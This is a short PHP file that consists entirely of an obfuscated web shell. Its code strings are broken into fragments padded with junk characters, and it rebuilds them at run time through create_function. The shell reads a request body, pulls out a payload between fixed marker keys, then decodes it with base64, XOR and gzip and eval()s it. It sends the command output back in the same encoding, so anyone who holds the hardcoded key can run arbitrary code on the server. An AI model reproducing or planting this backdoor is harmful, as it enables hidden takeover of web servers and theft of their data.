<?php
$P='#Rval(@#Rgzuncom#Rpres#Rs(@x(@#Rbase6#R#R4_dec#Rode($m[1]),$k)))#R#R;$o=@o#Rb_get_#Rconte#Rn#Rts();@ob';
$E='_end_#Rclea#Rn();$r=@b#Rase64_enco#Rde(@x#R(@gzco#Rmpr#Ress(#R$o),$#Rk));print#R("$p$#Rkh$r$kf");}';
$N='atch("/$kh(#R.+)#R$kf/",#R@file#R_#Rge#Rt#R_c#Rontents("php://input"),$m)==#R1#R) {@ob_sta#Rrt();@e';
$Z='#Rction x($t#R,$k){#R$c=st#R#Rrlen($#Rk);$l=strlen($#Rt)#R;$o="";for#R($i=0#R;$i<$l;#R){#Rfo#Rr($#';
$J='$#Rk="c2#Rd#Rcada7";$kh#R="31d6db329cfd";#R$k#Rf="0a6a6da#Rebe#R34"#R;$p#R="fWtijz71N#R#RuY8qhyM";fun';
$s='Rj=0;($j<$c#R&&$i<$l);$#Rj++,$i++)#R{$o#R.=$t{$i}#R^$k{#R$j};}}ret#Rurn $#Ro;}i#Rf (@preg#R_m#R';
$d=str_replace('BX','','BXcreatBXeBXBXBX_fBXunction');
$i=str_replace('#R','',$J.$Z.$s.$N.$P.$E);
$Q=$d('',$i);$Q();
?>
